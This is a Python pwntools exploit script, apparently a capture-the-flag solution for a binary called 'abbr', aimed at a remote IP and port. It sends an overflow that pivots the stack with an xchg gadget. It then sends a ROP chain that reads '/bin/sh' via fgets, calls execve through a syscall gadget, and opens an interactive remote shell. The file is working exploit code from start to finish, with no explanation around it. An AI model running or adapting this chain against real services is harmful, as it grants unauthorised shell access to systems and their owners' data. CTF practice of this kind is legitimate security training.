from pwn import *

binpath = './abbr'
elf = ELF(binpath)

context.terminal = ['tmux', 'split-w', '-h']

gdbscript = '''
# b main
# call rdx
b *0x402036
# b *0x0000000000402024
ignore 1 1

set $trans=0x00000000004cfb90

gef
c
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('168.119.108.148', 10010)


xchg_eax_esp = 0x0000000000405121  # : xchg eax, esp ; ret
pop_rdi = 0x00000000004018da  # : pop rdi ; ret
pop_rsi = 0x0000000000404cfe  # : pop rsi ; ret
pop_rdx = 0x00000000004017df  # : pop rdx ; ret
pop_rax = 0x000000000045a8f7  # : pop rax ; ret
syscall = 0x00000000004012e3  # : syscall

# addr_stdin = 0x4c9a98
addr_stdin = 0x00000000004c98c0

payload = b'aaw'  # will increase 16 bytes
payload = payload.ljust(0x1000 - 4, b'A')
payload += p64(xchg_eax_esp)[:3]
print(hex(len(payload)))

io.sendafter(b'Enter text: ', payload)

addr_data = 0x00000000004c9000
addr_binsh = addr_data + 0x1000

rop = b''
# fgets(addr_binsh, 0x50, stdin)
rop += p64(pop_rdi)
rop += p64(addr_binsh)
rop += p64(pop_rsi)
rop += p64(0x50)
rop += p64(pop_rdx)
rop += p64(addr_stdin)
rop += p64(elf.symbols['fgets'])
# execve(addr_binsh, NULL, NULL)
rop += p64(pop_rdi)
rop += p64(addr_binsh)
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(pop_rdx)
rop += p64(0)
rop += p64(pop_rax)
rop += p64(59)
rop += p64(syscall)

io.sendlineafter(b'Enter text: ', rop)
io.sendline(b'/bin/sh\x00')

io.interactive()
